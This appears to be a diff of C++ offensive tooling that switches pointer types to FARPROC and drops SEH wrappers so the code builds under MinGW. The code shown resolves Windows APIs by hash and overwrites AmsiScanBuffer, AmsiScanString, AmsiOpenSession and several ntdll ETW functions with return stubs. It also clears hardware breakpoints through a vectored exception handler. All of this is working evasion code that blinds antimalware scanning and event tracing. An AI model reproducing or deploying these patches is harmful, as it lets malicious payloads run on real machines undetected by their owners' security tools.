@@ -101,24 +101,24 @@ BOOL PatchAMSI() {
     if (!hAmsi) return FALSE;
 
     // Patch AmsiScanBuffer
-    PVOID pScan = HashProc(hAmsi, FNV("AmsiScanBuffer"));
+    FARPROC pScan = HashProc(hAmsi, FNV("AmsiScanBuffer"));
     if (pScan) {
         const BYTE patchScan[] = { 0x33, 0xC0, 0xC3 }; // xor eax,eax; ret
-        MemPatch(pScan, patchScan, sizeof(patchScan));
+        MemPatch(reinterpret_cast<PVOID>(pScan), patchScan, sizeof(patchScan));
     }
 
     // Also patch AmsiScanString for completeness
-    PVOID pStr = HashProc(hAmsi, FNV("AmsiScanString"));
+    FARPROC pStr = HashProc(hAmsi, FNV("AmsiScanString"));
     if (pStr) {
         const BYTE patchStr[] = { 0x33, 0xC0, 0xC3 };
-        MemPatch(pStr, patchStr, sizeof(patchStr));
+        MemPatch(reinterpret_cast<PVOID>(pStr), patchStr, sizeof(patchStr));
     }
 
     // Patch AmsiOpenSession to always succeed
-    PVOID pOpen = HashProc(hAmsi, FNV("AmsiOpenSession"));
+    FARPROC pOpen = HashProc(hAmsi, FNV("AmsiOpenSession"));
     if (pOpen) {
         const BYTE patchOpen[] = { 0x33, 0xC0, 0xC3 };
-        MemPatch(pOpen, patchOpen, sizeof(patchOpen));
+        MemPatch(reinterpret_cast<PVOID>(pOpen), patchOpen, sizeof(patchOpen));
     }
 
     return (pScan != nullptr);
@@ -147,9 +147,9 @@ BOOL PatchETW() {
     BOOL anyPatched = FALSE;
 
     for (int i = 0; etw_hashes[i]; ++i) {
-        PVOID p = HashProc(hNtdll, etw_hashes[i]);
+        FARPROC p = HashProc(hNtdll, etw_hashes[i]);
         if (p) {
-            MemPatch(p, ret1, sizeof(ret1));
+            MemPatch(reinterpret_cast<PVOID>(p), ret1, sizeof(ret1));
             anyPatched = TRUE;
         }
     }
@@ -175,10 +175,9 @@ BOOL ClearHardwareBreakpoints() {
     // 1. Self thread — VEH path
     PVOID hVeh = AddVectoredExceptionHandler(1, VehHwbpClear);
     if (hVeh) {
-        __try {
-            RaiseException(EXCEPTION_BREAKPOINT, 0, 0, nullptr);
-        } __except (EXCEPTION_EXECUTE_HANDLER) {
-        }
+        // VEH handles EXCEPTION_BREAKPOINT and returns EXCEPTION_CONTINUE_EXECUTION;
+        // no __try/__except needed — SEH wrappers are unsupported on MinGW.
+        RaiseException(EXCEPTION_BREAKPOINT, 0, 0, nullptr);
         RemoveVectoredExceptionHandler(hVeh);
     }
 
